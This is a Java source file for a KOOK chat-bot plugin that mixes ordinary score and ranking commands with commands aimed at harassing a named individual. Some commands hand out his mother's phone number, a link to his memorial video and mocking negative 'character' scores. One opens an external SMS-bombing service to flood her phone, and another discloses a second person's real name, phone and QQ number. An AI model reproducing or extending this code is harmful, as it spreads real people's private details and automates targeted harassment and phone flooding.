package dog.aonehax;

import dog.aonehax.commands.*;

import snw.jkook.JKook;
import snw.jkook.Unsafe;
import snw.jkook.command.JKookCommand;
import snw.jkook.config.file.YamlConfiguration;
import snw.jkook.config.serialization.ConfigurationSerialization;
import snw.jkook.message.component.card.*;
import snw.jkook.entity.User;
import snw.jkook.message.component.card.element.PlainTextElement;
import snw.jkook.message.component.card.module.HeaderModule;
import snw.jkook.message.component.card.module.ImageGroupModule;
import snw.jkook.message.component.card.module.SectionModule;
import snw.jkook.plugin.BasePlugin;

import java.awt.Desktop;
import java.io.File;
import java.io.IOException;
import java.net.URI;

public class LiMingShu extends BasePlugin {

    private static LiMingShu instance;

    @Override
    public void onLoad() {
        instance = this;
        ConfigurationSerialization.registerClass(Scoreboard.class);
    }

    @Override
    public void onEnable() {
        loadConfigs();
        registerCommands();
        getCore().getEventManager().registerHandlers(this, new EventListeners());

        getLogger().info(getConfig().getString("msg")); /* 2 */
        getConfig().set("msg", "fine"); /* 3 */

        getLogger().info("李铭舒Bot-2.5");
        String phone_number = "18910800763";
        String media = "www.bilibili.com/video/BV1i44y197oS";
        String esu = "已经开始压测";
        String stop = "已停止压测";
        String tiangou = "实名:王璀 " +
                "手机号:13269158216 " +
                "QQ:344903013";


        getLogger().info("李铭舒机器人 By SunriseMC Team");


        new JKookCommand("get_phone")
                .setDescription("获取李铭舒母亲手机号")
                .executesUser((sender, argyments, message) -> {
                    message.reply(phone_number);

                })
                .register(this);

        new JKookCommand("get_media")
                .setDescription("获取李铭舒追悼会视频")
                .executesUser((sender, argyments, message) -> {
                    message.reply(media);
                })
                .register(this);

        new JKookCommand("esu")
                .setDescription("短信压测李铭舒母亲")
                .executesUser((sender, argyments, message) -> {
                    String url = "https://tf0719.cn/dx/index.php?hm=18910800763&ok=";
                    try {
                        Desktop.getDesktop().browse(new URI(url));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    MultipleCardComponent card = new CardBuilder()
                            .setTheme(Theme.SUCCESS)
                            .setSize(Size.LG)
                            .addModule(new HeaderModule(new PlainTextElement("压测系统", false)))
                            .addModule(new SectionModule(new PlainTextElement("已经开始压测"),null, null))
                            .newCard()
                            .build();
                    message.sendToSource(card);
                })
                .register(this);

        new JKookCommand("停止")
                .setDescription("停止压测")
                .executesUser(new StopCommand())
                .register(this);

        new JKookCommand("人品")
                .setDescription("查看人品")
                .executesUser((sender, argyments, message) -> {
                    int rp = (int) (Math.random() * 100);
                    message.reply(String.valueOf(rp));
                })
                .register(this);

        new JKookCommand("李铭舒人品")
                .setDescription("查看李铭舒人品")
                .executesUser((sender, argyments, message) -> {
                    int lmsrp = (int) (Math.random() * -1000);
                    message.reply(String.valueOf(lmsrp));
                })
                .register(this);

        new JKookCommand("QQ")
                .setDescription("QQ")
                .executesUser(new QQCommand())
                .register(this);

        new JKookCommand("骰子")
                .setDescription("摇骰子")
                .executesUser((sender, argyments, message) -> {
                    int sz = (int) (Math.random() * 6);
                    message.reply(String.valueOf(sz));
                })
                .register(this);

        new JKookCommand("舔狗1号")
                .setDescription("获取NEKO大神信息")
                .executesUser((sender, argyments, message) -> {
                    message.reply(tiangou);

                })
                .register(this);




    }

    @Override
    public void onDisable() {
        saveConfigs();
    }

    private void loadConfigs() {
        try {
            YamlConfiguration data = YamlConfiguration.loadConfiguration(new File(getDataFolder(), "data.yml"));
            ScoreboardStorage.loadAll(data);
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            YamlConfiguration gcc = YamlConfiguration.loadConfiguration(new File(getDataFolder(), "guildchannelmapping.yml"));
            GuildChannelStorage.loadAll(gcc);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveConfigs() {
        YamlConfiguration score = new YamlConfiguration();
        ScoreboardStorage.saveAll(score);
        try {
            score.save(new File(getDataFolder(), "data.yml"));
        } catch (IOException e) {
            // you should record the data in other way if the data is important. e.g. print it to logger?
            getLogger().error("Unable to save data, we will print it here");
            getLogger().error(score.saveToString());
        }

        YamlConfiguration gcc = new YamlConfiguration();
        GuildChannelStorage.saveAll(gcc);
        try {
            gcc.save(new File(getDataFolder(), "guildchannelmapping.yml"));
        } catch (IOException e) {
            // you should record the data in other way if the data is important. e.g. print it to logger?
            getLogger().error("Unable to save guild->channel mapping, we will print it here");
            getLogger().error(gcc.saveToString());
        }
    }

    private void registerCommands() {
        new JKookCommand("rank")
                .setDescription("使用此命令获取你在此服务器中的积分数据！")
                .executesUser(new RankCommand())
                .register(this);
        new JKookCommand("ranklist")
                .setDescription("使用此命令获取此服务器的积分榜。仅展示前 10 个。")
                .executesUser(new RankListCommand())
                .register(this);
        new JKookCommand("setscore")
                .setDescription("使用此命令设置指定用户的分数。需要你有消息管理权限。使用 /help setscore 获取详细帮助。")
                .setHelpContent("/setscore @某人 分数")
                .addArgument(User.class)
                .addArgument(int.class)
                .executesUser(new SetScoreCommand())
                .register(this);
        new JKookCommand("active")
                .setDescription("将当前服务器的活跃频道设为发出命令时的消息所在的频道。活跃频道将被用于发送随机算式。需要你有消息管理权限。")
                .executesUser(new ActiveCommand())
                .register(this);
    }

    public static LiMingShu getInstance() {
        return instance;
    }
}



